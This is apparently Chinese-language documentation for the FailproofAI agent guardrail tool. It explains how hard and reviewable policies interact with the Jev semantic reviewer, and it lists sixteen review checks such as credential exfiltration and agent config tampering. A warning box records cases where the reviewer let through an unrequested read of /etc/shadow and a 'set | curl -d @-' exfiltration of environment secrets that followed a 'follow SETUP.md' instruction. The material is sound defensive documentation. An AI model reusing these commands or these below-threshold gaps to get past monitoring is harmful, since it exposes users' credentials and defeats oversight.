当您通过 FailproofAI Cloud 或自己的密钥配置 [Jev 策略审查](/zh/policies/jev) 时，每个受门控的工具调用都会由您运行的策略以及 Jev 进行判断。Jev 会询问该调用实际执行的操作，以及发出任务的用户是否确实请求了该操作。每个策略的**权限**决定了两者产生分歧时的处理方式。

未配置 Jev 时，权限不起任何作用。每个策略的执行方式与以往完全相同。

## Hard 与 Reviewable

- **Hard** 是默认值。Hard 策略的 deny 或指令是最终决定：Jev 无法解除它，且 hard deny 会直接停止调用而不等待 Jev。
- **Reviewable** 意味着 Jev 可以解除策略的判定，但只能通过策略在 `reviewedBy` 中指定的语义检查来实现。只有当**所有**指定的检查都针对此调用被询问过，且每个检查均未发现问题或记录到用户请求了此操作时，判定才会被解除。某个检查**触发**了——即发现了相关问题——而用户未请求该操作，则即使该检查本身的判定只是警告，拦截依然维持。Jev 未被询问的检查（因为它不适用于该工具）无论其他检查结果如何，都不会解除任何拦截。有一条软化规则算作同意：当调用是用户所给任务的一个步骤且不超出任务范围时，Jev 会将 deny 转为 warning，该 warning 会解除策略的拦截，并作为反馈告知 Agent。

只有满足以下所有条件，策略才是 reviewable 的：

1. 声明 `authority: "reviewable"`。
2. `reviewedBy` 是非空列表，且每个条目都是已安装插件包所声明的 Jev 检查。Failproof AI 本身不附带任何 Jev 检查：[下方的十六个检查](#semantic-policy-names)来自 `failproofai policies add FailproofAI/jev-policies`。若没有插件包声明检查，则所有策略均为 hard。
3. 不是 `alwaysOn`。阻止 Agent 禁用 Failproof AI 的防护始终为 hard。

其他情况均为 hard：缺少字段、值拼写错误、`reviewedBy` 为空或格式错误，或者名称不是当前机器可以询问的检查。未知名称会使整个声明变为 hard，而不是被跳过，因为 `reviewedBy` 的含义是"所有这些都必须被询问，且均不能拒绝"，跳过某个名称会导致 Jev 以比您要求的更少的检查来解除策略。

一旦配置了 Jev，当 Failproof AI 拒绝某个 `reviewable` 声明时，每个进程只会记录一次警告。未配置 Jev 时不会有任何提示，因为此时权限不影响任何决策。`failproofai publish` 拒绝构建包含此类声明的插件包，以便插件包作者在安装前就能发现问题。它会将 `reviewedBy` 与以下情况进行对照验证：若插件包自身声明了检查，则与其声明的检查对照；否则与 `FailproofAI/jev-policies` 的十六个名称对照。

## 权限的声明位置

每种将策略应用到机器的方式都有一个决定其权限的位置：

| 来源 | 声明位置 | 默认值 |
| --- | --- | --- |
| 内置策略 | 下方表格 | Hard，除非列为 reviewable |
| 自定义策略文件 | `customPolicies.add` 上的 `authority` 和 `reviewedBy` | Hard |
| 策略插件包 | 插件包清单（`failproofai-pack.json`）中每个策略的条目 | Hard |
| 云管理策略 | 策略在活跃部署中的分配设置 | Hard。部署目前尚未设置此项，因此今天所有云管理策略均为 hard。|

对于插件包或云管理策略，策略代码内部设置的字段会被忽略；清单或分配设置才是决定因素。插件包只能描述自己的策略：其策略名称不能包含 `/`，且注册在插件包自己的命名前缀下，因此任何清单都无法将内置策略或其他插件包的策略标记为 reviewable。插件包代码中注册但未在清单中声明的策略为 hard。

两个插件包，或两个云管理策略，若其代码字节完全相同，则共享同一个构件并作为一个策略加载。只有当其中**每一个**都声明为 reviewable 时，该策略才是 reviewable 的，且 Jev 必须清除其中任意一个所命名的所有检查。若其中任何一个声明为 hard，或根本没有声明，则保持为 hard。插件包或策略的列举顺序从不影响结果。

大多数机器从 `FailproofAI/policies` 插件包获取内置策略，并从该插件包的清单中读取其权限。下方的 reviewable 条目在安装了包含这些条目的插件包版本后生效；旧版本不包含任何 reviewable 条目，因此其中的所有策略保持为 hard。

## 在自定义策略中声明权限

```js
import { customPolicies, deny, allow } from "failproofai";

customPolicies.add({
  name: "block-prod-config-reads",
  description: "Keep production credentials out of the agent's context",
  match: { events: ["PreToolUse"] },
  authority: "reviewable",
  reviewedBy: ["secret-exposure"],
  fn: async (ctx) =>
    String(ctx.toolInput?.file_path ?? "").includes("/config/prod/")
      ? deny("Production config is off limits")
      : allow(),
});
```

`failproofai publish` 会将这两个字段复制到插件包清单中，因此以插件包形式发布的策略会保留其作者赋予的权限。若声明无法生效，则拒绝构建插件包：值不是 `"hard"` 或 `"reviewable"`、`reviewedBy` 不是名称列表，或者名称不是有效的检查——若插件包自身声明了检查，则与其 [Jev 检查](/zh/policies/publish-a-pack#jev-checks-in-a-pack)对照；否则与内置检查对照。

## 内置策略

仅在语义策略真正覆盖相同关切时才为 reviewable。所有其他内置策略均为 hard。

覆盖关切是必要条件但不充分，且两种出错方式都是静默的：

- **从未被询问的检查**会使拦截永久化。`reviewedBy` 是一个合取条件，从未被询问的检查永远不会解除拦截，因此与一个前置条件对该策略匹配的输入形状不会触发的检查配对，该策略将永远无法被解除。
- **被询问但未触发的检查**会返回"无关切"，而无关切则解除拦截。因此，与一个无法对您策略的输入形状建模的检查配对，并不是在审查策略——而是将其对检查无法理解的输入精确地关闭。

instruct 模式的语义策略永远不能返回 deny，但它仍然可以维持拦截：当它触发且用户未请求该调用时，它所审查的策略不会被解除。`FailproofAI/jev-policies` 中有六个检查是仅 instruct 模式的——`push-to-protected-branch`、`commit-on-protected-branch`、`read-outside-workspace`、`system-modification`、`env-secrets-dump` 和 `external-data-egress`——[下方表格](#semantic-policy-names)列出了每个检查的模式。需要问的关键问题是**"是否还有任何能够 deny 的机制"**：解除绝不能使关切处于无任何机制执行的状态。引擎针对每次调用应用此测试。未经同意的 warning 不算解除，因为在工具调用之前，warning 不会阻止 Agent。当一个*可以* deny 的检查发出 warning——其证据未达到 deny 阈值——且用户未请求该调用时，该调用上的任何内容都不会被解除，所有正则表达式 deny 依然有效。

<Warning>
**恰好低于触发阈值的检查不会维持底线。** 上述规则需要检查*触发*（证据 ≥ 0.7）。当所有相关检查的得分恰好低于该值时，没有任何检查触发，审查者返回"无关切"，reviewable deny 被解除。在强制模式下的实测数据：对 `/etc/shadow` 的未请求 Read（`secret-exposure` 0.69，`read-outside-workspace` 0.37，后者只对主目录路径建模）和在"follow SETUP.md"之后执行的 `set | curl -d @- …`（`env-secrets-dump` 0.66，`credential-exfiltration` 0.65，`sends_out` 0.97）均被放行，而单独的正则表达式层会拒绝它们。这些阈值是在标注语料库上校准的，尚未针对此情况重新测量；在重新测量之前，对于上述任何一种形状通过比其误拦截更重要的场景，请将策略保持为 **hard**。
</Warning>

## 语义策略名称

以下是 `FailproofAI/jev-policies` 声明的检查，也是安装该插件包后 `reviewedBy` 接受的值。Failproof AI 本身不附带其中任何一个：没有该插件包（或其他声明这些名称的插件包），命名这些检查的策略均不是 reviewable 的。每个检查都是 Jev 针对当前工具调用所回答的问题。**模式**是检查能够返回的结果：`deny` 检查在证据充分时会拦截，而 `instruct` 检查只会发出警告。两者在触发且用户未请求该调用时，都会维持策略的 deny。**用户可覆盖**表示用户的明确请求是否可以解除该检查。

Jev 只询问已安装插件包所声明的 [Jev 检查](/zh/policies/publish-a-pack#jev-checks-in-a-pack)，这些也是 `reviewedBy` 接受的名称。两个插件包以不同方式声明同一名称时，两者均不被采用。这十六个名称中，若由非 FailproofAI 仓库安装的插件包声明，在该插件包中会被忽略：其版本永远不会被询问，也不会与 FailproofAI 自己的版本竞争，因此第三方插件包既不能成为解除核心插件包策略的检查，也不能关闭这些检查中的任何一个。无法读取的插件包列表，或每个检查均不可用的插件包，会使 Jev 没有任何内容可以询问。

| 名称 | 模式 | 用户可覆盖 | Jev 检查的内容 |
| --- | --- | --- | --- |
| `destructive-deletion` | deny | 是 | 永久删除无法再生的数据。 |
| `production-infra-change` | deny | 是 | 更改生产基础设施。 |
| `git-history-rewrite` | deny | 是 | 重写或丢弃共享的 git 历史。 |
| `push-to-protected-branch` | instruct | 是 | 直接推送到受保护分支。 |
| `commit-on-protected-branch` | instruct | 是 | 直接在受保护分支上提交。 |
| `secret-exposure` | deny | 是 | 读取或复制凭证。 |
| `credential-exfiltration` | deny | 否 | 将密钥或私有文件发送到机器外部。 |
| `remote-code-execution` | deny | 是 | 运行从互联网下载的代码。 |
| `privilege-escalation` | deny | 是 | 以提升的权限运行。 |
| `database-destruction` | deny | 是 | 销毁或批量修改数据库数据。 |
| `read-outside-workspace` | instruct | 是 | 读取项目之外的文件。 |
| `agent-config-tampering` | deny | 否 | 更改 Agent 自身的安全配置。 |
| `system-modification` | instruct | 是 | 在项目之外更改系统。 |
| `env-secrets-dump` | instruct | 是 | 打印环境密钥。 |
| `external-destructive-action` | deny | 是 | 通过外部工具执行不可逆操作。 |
| `external-data-egress` | instruct | 是 | 将私有数据发送到外部工具。 |
